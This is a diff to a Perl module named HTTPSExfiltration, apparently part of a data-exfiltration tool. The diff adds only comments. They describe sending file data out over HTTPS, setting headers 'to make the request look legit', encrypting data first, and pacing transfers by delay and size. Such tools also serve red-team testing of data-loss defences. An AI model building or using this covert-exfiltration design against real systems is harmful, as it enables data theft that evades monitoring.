@@ -1,5 +1,11 @@
 #!/usr/bin/perl
 
+# -----------------------------------------------------------------------#
+#                                                                        #
+# The HTTPSExfiltration package exfiltrates data via the HTTPS protocol. #
+#                                                                        #
+# -----------------------------------------------------------------------#
+
 package HTTPSExfiltration;
 
 require Entity::ExfiltrationEngine;
@@ -16,6 +22,9 @@ use constant IN_TRANSFER    => 0;
 use constant END_TRANSFER   => -1;
 use constant LIMIT_TRANFER  => 4000;
 
+#
+# Set the header fields to make the request look legit.
+#
 sub setHeader {
     my($req) = @_;
 
@@ -29,6 +38,9 @@ sub setHeader {
     $req->header('If-SSL-Cert-Subject' => '/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd');
 }
 
+#
+# Format the data before exfiltration and apply encryption if needed.
+#
 sub sendData {
     my($self, $request, $userAgent, $file, $data, $id, $state) = @_;
     my $res = 0;
@@ -47,6 +59,10 @@ sub sendData {
     }
 }
 
+#
+# Perform data exfiltration by taking into account the delay and the size passed
+# in arguments.
+#
 sub exfiltrate {
     my($self, $file) = @_;
     my($data, $n, $count, $size);
